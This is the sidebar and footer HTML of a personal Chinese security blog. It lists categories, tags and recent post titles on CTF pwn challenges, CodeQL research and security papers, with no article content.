class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/AI/machine-learning/"><span class="level-start"><span class="level-item">machine_learning</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">41</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/CVE/"><span class="level-start"><span class="level-item">CVE</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/crypto/"><span class="level-start"><span class="level-item">crypto</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">23</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/pwnable-kr/"><span class="level-start"><span class="level-item">pwnable.kr</span></span><span class="level-end"><span class="level-item tag">21</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/pwnable-kr/Toddler-sBottle/"><span class="level-start"><span class="level-item">Toddler&#039;sBottle</span></span><span class="level-end"><span class="level-item tag">21</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/stack-overflow/"><span class="level-start"><span class="level-item">stack_overflow</span></span><span class="level-end"><span class="level-item tag">2</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/stack-overflow/ROP-Emporium/"><span class="level-start"><span class="level-item">ROP_Emporium</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/re/"><span class="level-start"><span class="level-item">re</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/writeup/"><span class="level-start"><span class="level-item">writeup</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/PyQt5/"><span class="level-start"><span class="level-item">PyQt5</span></span><span class="level-end"><span class="level-item tag">12</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/PyQt5/Web/"><span class="level-start"><span class="level-item">Web</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/PyQt5/%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"><span class="level-start"><span class="level-item">图书馆管理系统</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/life/"><span class="level-start"><span class="level-item">life</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/"><span class="level-start"><span class="level-item">papers</span></span><span class="level-end"><span class="level-item tag">12</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/papers/security/"><span class="level-start"><span class="level-item">security</span></span><span class="level-end"><span class="level-item tag">12</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/papers/security/automatic-analyse/"><span class="level-start"><span class="level-item">automatic_analyse</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/fuzz/"><span class="level-start"><span class="level-item">fuzz</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/mobile-security/"><span class="level-start"><span class="level-item">mobile_security</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/others/"><span class="level-start"><span class="level-item">others</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/security-situation-awareness/"><span class="level-start"><span class="level-item">security_situation_awareness</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/research/"><span class="level-start"><span class="level-item">research</span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/research/codeql/"><span class="level-start"><span class="level-item">codeql</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/tools/"><span class="level-start"><span class="level-item">tools</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content size-small"><p><time datetime="2020-12-07T05:23:32.437Z">2020-12-07</time></p><p class="title is-6"><a class="link-muted" href="/fa711cc5.html">research/linux_kernel/linux切换内核版本</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-12-01T12:28:46.725Z">2020-12-01</time></p><p class="title is-6"><a class="link-muted" href="/930679b9.html">Similarity of Binaries Across Optimization Levels and Obfuscation(ESORICS 2020)</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/papers/">papers</a> / <a class="link-muted" href="/categories/papers/security/">security</a> / <a class="link-muted" href="/categories/papers/security/automatic-analyse/">automatic_analyse</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-11-17T06:37:14.383Z">2020-11-17</time></p><p class="title is-6"><a class="link-muted" href="/b3ed7ec5.html">CodeQL之CWE-401(3)</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/research/">research</a> / <a class="link-muted" href="/categories/research/codeql/">codeql</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-11-17T01:34:21.616Z">2020-11-17</time></p><p class="title is-6"><a class="link-muted" href="/aaf64f84.html">CodeQL之CWE-401(2)</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/research/">research</a> / <a class="link-muted" href="/categories/research/codeql/">codeql</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-11-17T01:33:56.088Z">2020-11-17</time></p><p class="title is-6"><a class="link-muted" href="/81db1c47.html">CodeQL之CWE-401(1)</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/research/">research</a> / <a class="link-muted" href="/categories/research/codeql/">codeql</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/AI/"><span class="tag">AI</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">41</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/NLP/"><span class="tag">NLP</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PyQt5/"><span class="tag">PyQt5</span><span class="tag is-grey-lightest">12</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ROP-Emporium/"><span class="tag">ROP Emporium</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Toddler-s-Bottle/"><span class="tag">Toddler&#039;s Bottle</span><span class="tag is-grey-lightest">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Web/"><span class="tag">Web</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/automatic-analyse/"><span class="tag">automatic analyse</span><span class="tag is-grey-lightest">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/codeql/"><span class="tag">codeql</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crypto/"><span class="tag">crypto</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/life/"><span class="tag">life</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/machine-learning/"><span class="tag">machine learning</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mobile-security/"><span class="tag">mobile security</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/others/"><span class="tag">others</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/paper/"><span class="tag">paper</span><span class="tag is-grey-lightest">12</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag is-grey-lightest">23</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-kr/"><span class="tag">pwnable.kr</span><span class="tag is-grey-lightest">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/re/"><span class="tag">re</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/research/"><span class="tag">research</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/security/"><span class="tag">security</span><span class="tag is-grey-lightest">12</span></a></div><div class="control"><a class="tags has-addons" href="/tags/security-situation-awareness/"><span class="tag">security situation awareness</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/stack-overflow/"><span class="tag">stack overflow</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tools/"><span class="tag">tools</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/writeup/"><span class="tag">writeup</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"><span class="tag">数据库</span><span class="tag is-grey-lightest">11</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">食兔人的博客</a><p class="size-small"><span>&copy; 2020 ycdxsb</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("zh-CN")</script><script>var IcarusThemeSettings={site:{url:"https://blog.ycdxsb.cn",external_link:{enable:!0,exclude:[]}},article:{highlight:{clipboard:!0,fold:"unfolded"}}}</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener("DOMContentLoaded",function(){loadInsight({contentUrl:"/content.json"},{hint:"想要查找什么...",untitled:"(无标题)",posts:"文章",pages:"页面",categories:"分类",tags:"标签"})})</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":200,"height":400},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body></html>